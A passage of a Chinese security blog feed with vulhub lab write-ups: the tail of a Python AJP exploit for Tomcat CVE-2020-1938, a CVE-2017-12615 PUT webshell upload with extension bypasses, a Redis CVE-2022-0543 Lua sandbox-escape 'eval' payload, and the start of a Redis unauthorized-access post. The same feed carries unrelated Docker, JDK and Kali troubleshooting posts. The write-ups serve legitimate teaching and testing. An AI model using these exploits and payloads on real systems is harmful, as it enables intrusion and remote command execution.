unpack_string(stream)</span><br><span class="line">            self.response_headers[h_name] = h_value</span><br><span class="line"></span><br><span class="line">    def parse_send_body_chunk(self, stream):</span><br><span class="line">        self.data_length, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        self.data = stream.read(self.data_length + 1)</span><br><span class="line"></span><br><span class="line">    def parse_end_response(self, stream):</span><br><span class="line">        self.reuse, = unpack(stream, &quot;b&quot;)</span><br><span class="line"></span><br><span class="line">    def parse_get_body_chunk(self, stream):</span><br><span class="line">        rlen, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        return rlen</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def receive(stream):</span><br><span class="line">        r = AjpResponse()</span><br><span class="line">        r.parse(stream)</span><br><span class="line">        return r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):</span><br><span class="line">    fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)</span><br><span class="line">    fr.method = method</span><br><span class="line">    fr.protocol = &quot;HTTP/1.1&quot;</span><br><span class="line">    fr.req_uri = req_uri</span><br><span class="line">    fr.remote_addr = target_host</span><br><span class="line">    fr.remote_host = None</span><br><span class="line">    fr.server_name = target_host</span><br><span class="line">    fr.server_port = 80</span><br><span class="line">    fr.request_headers = &#123;</span><br><span class="line">        &#x27;SC_REQ_ACCEPT&#x27;: &#x27;text/html&#x27;,</span><br><span class="line">        &#x27;SC_REQ_CONNECTION&#x27;: &#x27;keep-alive&#x27;,</span><br><span class="line">        &#x27;SC_REQ_CONTENT_LENGTH&#x27;: &#x27;0&#x27;,</span><br><span class="line">        &#x27;SC_REQ_HOST&#x27;: target_host,</span><br><span class="line">        &#x27;SC_REQ_USER_AGENT&#x27;: &#x27;Mozilla&#x27;,</span><br><span class="line">        &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate, sdch&#x27;,</span><br><span class="line">        &#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.5&#x27;,</span><br><span class="line">        &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;,</span><br><span class="line">        &#x27;Cache-Control&#x27;: &#x27;max-age=0&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    fr.is_ssl = False</span><br><span class="line">    fr.attributes = []</span><br><span class="line">    return fr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Tomcat(object):</span><br><span class="line">    def __init__(self, target_host, target_port):</span><br><span class="line">        self.target_host = target_host</span><br><span class="line">        self.target_port = target_port</span><br><span class="line"></span><br><span class="line">        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">        self.socket.connect((target_host, target_port))</span><br><span class="line">        self.stream = self.socket.makefile(&quot;rb&quot;, buffering=0)</span><br><span class="line"></span><br><span class="line">    def perform_request(self, req_uri, headers=&#123;&#125;, method=&#x27;GET&#x27;, user=None, password=None, attributes=[]):</span><br><span class="line">        self.req_uri = req_uri</span><br><span class="line">        self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri,</span><br><span class="line">                                                           method=AjpForwardRequest.REQUEST_METHODS.get(method))</span><br><span class="line">        print(&quot;Getting resource at ajp13://%s:%d%s&quot; % (self.target_host, self.target_port, req_uri))</span><br><span class="line">        if user is not None and password is not None:</span><br><span class="line">            self.forward_request.request_headers[</span><br><span class="line">                &#x27;SC_REQ_AUTHORIZATION&#x27;] = f&#x27;Basic &#123;base64.b64encode(f&quot;&#123;user&#125;:&#123;password&#125;&quot;.encode()).decode()&#125;&#x27;</span><br><span class="line">        for h in headers:</span><br><span class="line">            self.forward_request.request_headers[h] = headers[h]</span><br><span class="line">        for a in attributes:</span><br><span class="line">            self.forward_request.attributes.append(a)</span><br><span class="line">        responses = self.forward_request.send_and_receive(self.socket, self.stream)</span><br><span class="line">        if len(responses) == 0:</span><br><span class="line">            return None, None</span><br><span class="line">        snd_hdrs_res = responses[0]</span><br><span class="line">        data_res = responses[1:-1]</span><br><span class="line">        if len(data_res) == 0:</span><br><span class="line">            print(&quot;No data in response. Headers:%s\n&quot; % snd_hdrs_res.response_headers)</span><br><span class="line">        return snd_hdrs_res, data_res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">javax.servlet.include.request_uri</span><br><span class="line">javax.servlet.include.path_info</span><br><span class="line">javax.servlet.include.servlet_path</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(&quot;target&quot;, type=str, help=&quot;Hostname or IP to attack&quot;)</span><br><span class="line">parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, type=int, default=8009, help=&quot;AJP port to attack (default is 8009)&quot;)</span><br><span class="line">parser.add_argument(&quot;-f&quot;, &#x27;--file&#x27;, type=str, default=&#x27;WEB-INF/web.xml&#x27;, help=&quot;file path :(WEB-INF/web.xml)&quot;)</span><br><span class="line">parser.add_argument(&#x27;--rce&#x27;, type=bool, default=False, help=&quot;read file(default) or exec command&quot;)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">t = Tomcat(args.target, args.port)</span><br><span class="line">_, data = t.perform_request(f&#x27;/hissec&#123;&quot;.jsp&quot; if args.rce else &quot;&quot;&#125;&#x27;, attributes=[</span><br><span class="line">    &#123;&#x27;name&#x27;: &#x27;req_attribute&#x27;, &#x27;value&#x27;: [&#x27;javax.servlet.include.request_uri&#x27;, &#x27;/&#x27;]&#125;,</span><br><span class="line">    &#123;&#x27;name&#x27;: &#x27;req_attribute&#x27;, &#x27;value&#x27;: [&#x27;javax.servlet.include.path_info&#x27;, args.file]&#125;,</span><br><span class="line">    &#123;&#x27;name&#x27;: &#x27;req_attribute&#x27;, &#x27;value&#x27;: [&#x27;javax.servlet.include.servlet_path&#x27;, &#x27;/&#x27;]&#125;,</span><br><span class="line">])</span><br><span class="line">print(&#x27;----------------------------&#x27;)</span><br><span class="line">print(&#x27;&#x27;.join([d.data.decode(&#x27;utf_8&#x27;) for d in data]))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327215041264.png" alt="image-20250327215041264"></p><p>然后就能在监听处执行命令了，说明getshell成功了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327215154910.png" alt="image-20250327215154910"></p><p>到此该漏洞利用结束。</p><h2 id="CVE-2017-12615">CVE-2017-12615</h2><p>PUT方法任意写文件漏洞（CVE-2017-12615）</p><blockquote><p>kali靶机：192.168.192.132</p><p>win10攻击机：192.168.192.129</p></blockquote><h3 id="漏洞原理">漏洞原理</h3><p>由于配置不当（非默认配置），将配置文件conf/web.xml中的readonly设置为了 false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀的文件。<br>默认情况下 readonly 为 true，当 readonly 设置为 false 时，可以通过 PUT / DELETE 进行文件操控并可以执行任意代码。</p><blockquote><p>影响范围：Apache Tomcat 7.0.0 - 7.0.81</p></blockquote><p>该版本Tomcat配置了可写（readonly=false），导致我们可以往服务器写文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3e37200026689dd67856838a099a0b3a.png" alt="img"></p><h3 id="漏洞复现-2">漏洞复现</h3><p>开启环境，并且查看配置文件conf/web.xml中的readonly是否设置为<code> false</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker exec -ti 容器id bash</span><br><span class="line">cat conf/web.xml | grep readonly</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328143138882.png" alt="image-20250328143138882"></p><p>接下来抓包看看是GET方法，将其修改为PUT方法，上传一个shell.jsp（哥斯拉生成一个jsp马，然后用记事本打开复制代码）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328144633865.png" alt="image-20250328144633865"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328144943071.png" alt="image-20250328144943071"></p><p>响应包可以看到报错了。Tomcat 在一定程度上检查了文件后缀（不能直接写 jsp），直接上传导致报错，但我们还是可以通过一些文件系统功能绕过限制。</p><h3 id="绕过方法">绕过方法</h3><blockquote><p>方法一：使用斜杠/，斜杠在文件名中是非法的，所以会被去除（Linux和Windows中都适用）</p><p>方法二：首先使用<code>%20</code>绕过。<code>%20</code>对应的是空格，在windows中若文件这里在jsp后面添加<code>%20</code>即可达到自动抹去空格的效果。</p><p>方法三：使用Windows NTFS流，在jsp后面添加<code>::$DATA</code></p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328145217887.png" alt="image-20250328145217887"></p><p>上传成功，在docker容器中看看，发现有这个文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328145332083.png" alt="image-20250328145332083"></p><p>使用哥斯拉连接来getshell</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328145733623.png" alt="image-20250328145733623"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328145804009.png" alt="image-20250328145804009"></p>]]></content>
    
    
    <summary type="html">🥧【vulhub漏洞靶场】tomcat漏洞及漏洞复现；【vulhub漏洞靶场】tomcat漏洞tomcat8及漏洞复现；【vulhub漏洞靶场】tomcat漏洞CVE-2020-1938及漏洞复现；【vulhub漏洞靶场】tomcat漏洞CVE-2017-12615及漏洞复现</summary>
    
    
    
    <category term="web渗透" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="笔记" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>docker-compose启动报错（library initialization failed - unable to allocate file descriptor table - out of memory#）问题解决</title>
    <link href="https://blog.m3x1.cn/posts/eab53833.html"/>
    <id>https://blog.m3x1.cn/posts/eab53833.html</id>
    <published>2025-03-26T16:00:00.000Z</published>
    <updated>2025-03-26T15:03:28.604Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="前言">前言</h2><p>我用docker开启容器靶场的时候，出现这个报错，最后出现139报错代号，然后去网上查找各种资料到处试，最后问题解决了，用这篇文章记录一下。</p><h2 id="问题描述">问题描述</h2><blockquote><p>library initialization failed - unable to allocate file descriptor table - out of memory#</p></blockquote><p>翻译过来就是说：库初始化失败 - 无法分配文件描述符表 - 内存不足#</p><h2 id="原因">原因</h2><p>(1) LimitNOFILE=<a href="https://so.csdn.net/so/search?q=infinity&amp;spm=1001.2101.3001.7020">infinity</a> 虽然是不限制，但是在systemctl版本小于234的时候不生效，查看systemctl版本：systemctl --version</p><p>(2) docker容器的ulimit太小了，有文档说太大也不行</p><h2 id="解决方法">解决方法</h2><h3 id="解决方法一">解决方法一</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#修改/lib/systemd/system/docker.service文件</span><br><span class="line"></span><br><span class="line">LimitCORE=infinity</span><br><span class="line">LimitNOFILE=infinity</span><br><span class="line">LimitNPROC=infinity</span><br><span class="line">改成</span><br><span class="line">LimitCORE=65535</span><br><span class="line">LimitNOFILE=65535</span><br><span class="line">LimitNPROC=65535</span><br><span class="line"></span><br><span class="line">#重启docker服务</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h3 id="解决方法二">解决方法二</h3><p>问题<br>因运存不足无法给进程分配更多的文件句柄数而异常退出</p><p>原运行指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run  -d -p 8080:8080 docker-test:v1.0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --ulimit nofile=1024 -d -p 8080:8080 docker-test:v1.0</span><br></pre></td></tr></table></figure><p>改为</p><h3 id="解决方法三">解决方法三</h3><p>在 /etc/systemd/system/ 目录下， 创建 docker.service.d 目录<br>进入该目录，创建一个文件，名为 docker.conf<br>在文件中加入以下配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">ExecStart=</span><br><span class="line">ExecStart=/usr/bin/dockerd --default-ulimit nofile=65535:65535 -H fd://</span><br></pre></td></tr></table></figure><h2 id="个人总结">个人总结</h2><p>我是使用的方法一修改了一下，修改/lib/systemd/system/docker.service文件，大概如下图：</p><p>在ExecStart后面加上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--default-ulimit nofile=65535:65535</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326225855172.png" alt="image-20250326225855172"></p><p>然后按方法一修改</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326225917085.png" alt="image-20250326225917085"></p><p>之后问题就解决了。</p>]]></content>
    
    
    <summary type="html">🥧docker-compose启动报错（library initialization failed - unable to allocate file descriptor table - out of memory#）问题解决</summary>
    
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>解决win10使用jar命令出现”jar不是内部或外部命令”的问题</title>
    <link href="https://blog.m3x1.cn/posts/4de01283.html"/>
    <id>https://blog.m3x1.cn/posts/4de01283.html</id>
    <published>2025-03-26T16:00:00.000Z</published>
    <updated>2025-03-27T04:53:14.423Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="分析原因">分析原因</h2><p>是因为JDK11以后就不再默认创建 “jre” 文件夹和其内容了，需要手动配置。至于如何发现没有“jre”文件夹的，是因为看环境变量的路径里有“jre”的文件夹，但是我发现JDK里并没有，就上网一搜才知道原因。</p><h2 id="配置过程">配置过程</h2><p>首先在系统变量里新建 “JAVA_HOME” 变量，变量值为：“C:\Program Files\Java\jdk-11.0.9” （路径为自己的java文件路径，以下皆是）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/04928472f8cb730ebda4a2ba1dcdafd3.png" alt="在这里插入图片描述"></p><p>在系统变量里新建 “CLASSPATH” 变量，变量值为：“.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\tools.jar”</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7ea1758748f9266cd43b8d6ab6cfab4b.png" alt="在这里插入图片描述"></p><p>在系统变量里找到“Path” 变量，变量值为：“%JAVA_HOME%\bin”和”JAVA_HOME%\jre\bin”</p><p>这里注意，如果是如下图所示编辑界面（下图是错误示范），需要分两行添加上述变量值</p><p>如果”变量名+变量值“的样子（就像上面的配置图差不多），才用;连接（“%JAVA_HOME%\bin;JAVA_HOME%\jre\bin”）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0d63d1cc8ee295263419c0718e809542.png" alt="在这里插入图片描述"></p><p>接下来是重点了：</p><p>生成 “jre” 文件夹和其内容。<br>进入到安装目录下(C:\Program Files\Java\jdk-11.0.9)，在此处运行cmd，再输入：“bin\jlink.exe --module-path jmods --add-modules java.desktop --output jre”<br>这时候接着直接输入 “jar” 的话，还是会有错误：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b5371d495aabde202119568ba3c8b47a.png" alt="在这里插入图片描述"></p><p>直接关掉，重新开一个cmd就行了，直接按 “开始键” + “R&quot;，输入：“cmd”。这时候再试试：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/64d1016243b22e94e1a0b1aa07f73f15.png" alt="在这里插入图片描述"></p><p>这样就是成功了，然后就能使用jar了。</p><blockquote><p>参考文章：<a href="https://blog.csdn.net/sinat_20593627/article/details/109613547">win10解决‘jar’不是内部或外部命令，也不是可运行的程序 的问题_jar’ 不是内部或外部命令,也不是可运行的程序 或批处理文件。-CSDN博客</a></p></blockquote>]]></content>
    
    
    <summary type="html">🥧解决win10使用jar命令出现”jar不是内部或外部命令”的问题；windows10下载了java但是无法使用jar命令的问题原因和问题解决</summary>
    
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>kali扩展硬盘，以及导致开机延迟问题，一直卡在登录界面的问题解决</title>
    <link href="https://blog.m3x1.cn/posts/3b44ba93.html"/>
    <id>https://blog.m3x1.cn/posts/3b44ba93.html</id>
    <published>2025-03-25T16:00:00.000Z</published>
    <updated>2025-03-26T15:03:28.600Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="扩展硬盘">扩展硬盘</h2><p>今天我因为看到原来的kali虚拟机只有20g内存，就想扩展一下</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101617857-2116683396.png" alt="image-20220829233729344"></p><p>点开上面这个硬盘这一栏</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101618295-1284516527.png" alt="image-20220829233757522"></p><p>点开之后点击扩展，然后选择自己想要扩展的空间，这里根据自己情况自己决定</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101618752-1960261044.png" alt="image-20220829233824985"></p><p>在上述扩展磁盘容量之后，并不会直接把容量扩展到系统盘里，还需要我们自己去分配。</p><p>右上角搜索Gparted，kali有一个自带的分配磁盘空间的工具</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101619237-528678126.png" alt="image-20220830090014908"></p><p>本来是这样一个界面</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101619573-866531015.png" alt="image-20220830090052673"></p><p>然后右键点击停用交换空间，然后把中间这两个分区删除，只剩下sda1那个分区，因为如果存在中间这两个分区，就不能把扩展的磁盘空间分配给系统盘了。</p><p>中间的区域删除之后，就会只剩下一个sda1那个分区，然后就可以开始调整大小了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101619970-1314137064.png" alt="image-20220830090331897"></p><p>然后下面这个地方就会变化，变成你之前扩展的空间容量</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101620377-953480513.png" alt="image-20220830090502454"></p><p>然后你自行进行分配即可，不过这里注意要留出一些空间给交换区域，因为我们后面还是要重新建回原来的那个swap分区</p><p>如果你留有一部分空间的话，应该是可以点击新建分区的</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101620763-1046461728.png" alt="image-20220830090933936"></p><p>新建的分区文件系统要和原来一样，原来是extended的，新建的分区也要是extended的，然后那个swap分区也要在这个extended分区之下去建立。然后完成后开机发现变得很慢。</p><h2 id="开机延迟问题解决">开机延迟问题解决</h2><p>因为有一个关于uuid的信息我们还没有修改。</p><p>在linux中，uuid是通用唯一识别码。uuid是一个软件建构的标准，目的就是让分布式系统中的所用元素都能有唯一的辨识资讯，从而不需要透过中央控制端来做识别资讯的指定</p><p>大概意思就是一个识别码，如果你没有进行重新修改的话，你开机的时候还是会去寻找原来的uuid，因为我们这里已经删除重建过了分区，所以它的uuid码也发生了变化</p><p>通过下面这个命令可以查看uuid码</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo blkid</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101621219-13902332.png" alt="image-20220830091830957"></p><p>然后我们需要修改两个文件的uuid码</p><p>分别是/etc/fstab和/etc/initramfs-tools/conf.d/resume</p><p>我们可以用vim打开，如果你有其它编辑器，也可以用其它编辑器</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/fstab</span><br><span class="line">sudo vim /etc/initramfs-tools/conf.d/resume</span><br></pre></td></tr></table></figure><p>可能会出现下面的界面，直接按E开始编辑就可以</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101621646-272993183.png" alt="image-20220830092204947"></p><p>接下去就是vim的一个编辑界面</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101622029-954380503.png" alt="image-20220830092232770"></p><p>需要把上面的两个uuid分别改成对应的uuid，因为系统盘没变，所以这个ext4的uuid一般是不需要改变的，一般要改的就是下面的这个swap的uuid。改完保存后重启即可。</p>]]></content>
    
    
    <summary type="html">🥧kali扩展硬盘，以及导致开机延迟问题，一直卡在登录界面的问题解决；vm虚拟机kali扩展硬盘教程；kali扩展硬盘后的开机慢问题解决方法</summary>
    
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【vulhub漏洞靶场】redis漏洞（沙盒逃逸）CVE-2022-0543及漏洞复现</title>
    <link href="https://blog.m3x1.cn/posts/50ac647a.html"/>
    <id>https://blog.m3x1.cn/posts/50ac647a.html</id>
    <published>2025-03-25T16:00:00.000Z</published>
    <updated>2025-03-26T15:03:28.615Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="漏洞详情">漏洞详情</h2><h3 id="受影响的系统">受影响的系统</h3><ul><li><strong>仅限于 Debian 系 Linux 发行版</strong>（如 Debian、Ubuntu）及其衍生版本。</li><li><strong>不受影响的系统</strong>：CentOS、RHEL 等非 Debian 系发行版不受此漏洞影响（漏洞源于 Debian 维护者在打包 Redis 时的补丁问题，而非 Redis 自身代码问题）。</li></ul><h3 id="受影响的-Redis-版本范围">受影响的 Redis 版本范围</h3><ul><li>redis版本小于等于6.x的都可以尝试。</li></ul><h3 id="触发条件">触发条件</h3><p>攻击者需具备 Redis 的未授权访问权限或合法凭证。</p><h2 id="漏洞原理">漏洞原理</h2><h3 id="背景">背景</h3><p>Redis 允许通过 <code>eval</code> 命令执行 Lua 脚本，但正常情况下这些脚本运行在沙箱中，无法执行系统命令或文件操作。</p><h3 id="补丁引入的漏洞">补丁引入的漏洞</h3><p>Debian/Ubuntu 在打包 Redis 时，通过补丁代码向 Lua 沙箱中注入了一个名为 <code>package</code> 的全局对象。该对象本应在源码中被注释（出于沙箱安全考虑），但补丁错误地重新启用了它。</p><h3 id="沙盒逃逸过程">沙盒逃逸过程</h3><ul><li><strong>加载动态库</strong>：攻击者可通过 <code>package.loadlib</code> 加载 Lua 系统库（如 <code>liblua5.1.so.0</code>），调用其导出函数（如 <code>luaopen_io</code>）获取 <code>io</code> 库权限。</li><li><strong>执行命令</strong>：利用 <code>io.popen</code> 等函数执行任意系统命令。</li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> io_l = <span class="built_in">package</span>.<span class="built_in">loadlib</span>(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="string">&quot;luaopen_io&quot;</span>);</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">io</span> = io_l();</span><br><span class="line"><span class="keyword">local</span> f = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;r&quot;</span>);  <span class="comment">-- 执行系统命令</span></span><br><span class="line"><span class="keyword">local</span> res = f:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>);</span><br><span class="line">f:<span class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> res;</span><br></pre></td></tr></table></figure><h2 id="攻击思路">攻击思路</h2><p>单从攻击角度而言，可以使用redis未授权相同的打法，博客见：<a href="https://www.cnblogs.com/MrSoap/p/18737580">【vulhub】redis 4-unacc （redis未授权访问） - Mr_Soap - 博客园</a></p><p>从漏洞角度来看，使用<code>eval</code>函数执行上面的逃逸过程即可。</p><h2 id="漏洞复现">漏洞复现</h2><blockquote><p>kali靶机：192.168.192.132</p><p>kali攻击机：192.168.192.135</p></blockquote><p>靶机进入vulhub-master/redis/CVE-2022-0543中，使用docker启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326161957788.png" alt="image-20250326161957788"></p><p>攻击机进行redis未授权连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.192.132</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326162311984.png" alt="image-20250326162311984"></p><p>进行getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;);local io = io_l();local f = io.popen(&quot;whoami&quot;, &quot;r&quot;);local res = f:read(&quot;*a&quot;);f:close();return res;&#x27; 0</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326162631517.png" alt="image-20250326162631517"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326162822769.png" alt="image-20250326162822769"></p><p>说明已经能进行命令执行了。</p>]]></content>
    
    
    <summary type="html">🥧【vulhub漏洞靶场】redis漏洞（沙盒逃逸）CVE-2022-0543漏洞原理及漏洞复现；redis漏洞（沙盒逃逸）CVE-2022-0543漏洞详情</summary>
    
    
    
    <category term="web渗透" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="笔记" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【vulhub漏洞靶场】redis漏洞及redis漏洞复现</title>
    <link href="https://blog.m3x1.cn/posts/2ab81980.html"/>
    <id>https://blog.m3x1.cn/posts/2ab81980.html</id>
    <published>2025-03-24T16:00:00.000Z</published>
    <updated>2025-03-25T04:41:39.422Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="漏洞详情">漏洞详情</h2><blockquote><p>影响版本 Redis 2.x，3.x，4.x，5.x</p></blockquote><p>Redis默认情况下，会绑定在0.0.0.0:6379(在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错)，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等等，这样将会将Redis服务暴露在公网上，如果在没有设置密码认证(默认为空)的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。</p><p>攻击者在未授权访问Redis的情况下，利用Redis自身的提供的config命令，可以进行写文件操作，攻击者还可以成功将自己的ssh公钥写入目标服务器的/root/.ssh文件的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务器登录目标服务器。</p><p>漏洞的产生条件有以下两点:</p><p>(1) Redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网</p><p>(2) 没有设置密码认证（默认为空）或者弱密码，可以免密码登录redis服务</p><h2 id="漏洞复现">漏洞复现</h2><blockquote><p>kali靶机： 192.168.192.132</p><p>kali攻击机：192.168.192.135</p></blockquote><h4 id="靶机设置">靶机设置</h4><p>进入vulhub靶场的redis/4-unacc目录，输入命令，然后等待加载完毕。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325085647378.png" alt="image-20250325085647378"></p><blockquote><p>小提示：如果不成功，可能是没有挂代理（懂吧？）</p></blockquote><p>输入命令查看端口是6379</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose ps</span><br></pre></td></tr></table></figure><p><img 